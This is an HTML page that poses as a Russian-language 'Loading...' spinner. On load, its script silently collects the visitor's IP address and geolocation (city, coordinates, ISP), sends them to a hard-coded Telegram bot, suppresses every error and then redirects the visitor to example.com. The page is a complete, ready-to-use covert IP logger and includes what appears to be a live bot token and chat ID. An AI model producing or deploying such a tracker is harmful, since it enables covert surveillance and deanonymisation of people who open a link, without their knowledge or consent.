<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
            color: #333;
        }
        .container {
            text-align: center;
        }
        h1 {
            font-weight: 300;
            font-size: 2rem;
        }
        .spinner {
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 4px solid #ddd;
            border-top-color: #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Загрузка...</h1>
        <div class="spinner"></div>
    </div>

    <script>
        // ----------------- НАСТРОЙКИ -----------------
        const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
        const CHAT_ID = "8212240529";
        // ---------------------------------------------

        // Функция отправки сообщения в Telegram (тихо, без ошибок)
        function sendToTelegram(text) {
            if (!text) return;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
            // Пытаемся отправить, но если не получится — просто игнорируем ошибку
            fetch(url).catch(() => {});
        }

        // Основная цепочка: получаем IP, отправляем, затем пытаемся получить гео
        function start() {
            // 1. Получаем IP через ipify (надёжный HTTPS-сервис)
            fetch('https://api.ipify.org?format=json')
                .then(response => {
                    if (!response.ok) throw new Error('Network error');
                    return response.json();
                })
                .then(data => {
                    const ip = data.ip;
                    if (!ip) throw new Error('No IP');

                    // Отправляем IP в Telegram (первое сообщение)
                    sendToTelegram(`IP: ${ip}`);

                    // 2. Пробуем получить геоданные через ip-api.com (HTTPS)
                    // Но если этот запрос упадёт — ничего страшного, IP уже у нас есть.
                    return fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org`)
                        .then(res => {
                            if (!res.ok) throw new Error('Geo API error');
                            return res.json();
                        })
                        .then(geo => {
                            if (geo.status === 'success') {
                                const geoText = 
                                    `Геоданные:\n` +
                                    `Страна: ${geo.country || '—'}\n` +
                                    `Город: ${geo.city || '—'}\n` +
                                    `Координаты: ${geo.lat || '—'}, ${geo.lon || '—'}\n` +
                                    `Провайдер: ${geo.isp || '—'}`;
                                sendToTelegram(geoText);
                            }
                        })
                        .catch(() => {
                            // Гео не получились — молча игнорируем
                        });
                })
                .catch(() => {
                    // Если не удалось получить IP — отправляем заглушку (но на экране ничего не показываем)
                    sendToTelegram('Не удалось определить IP');
                });

            // Через 2.5 секунды перенаправляем пользователя на example.com
            setTimeout(() => {
                window.location.href = 'https://example.com';
            }, 2500);
        }

        // Запускаем всё после полной загрузки страницы
        window.addEventListener('load', start);
    </script>
</body>
</html>
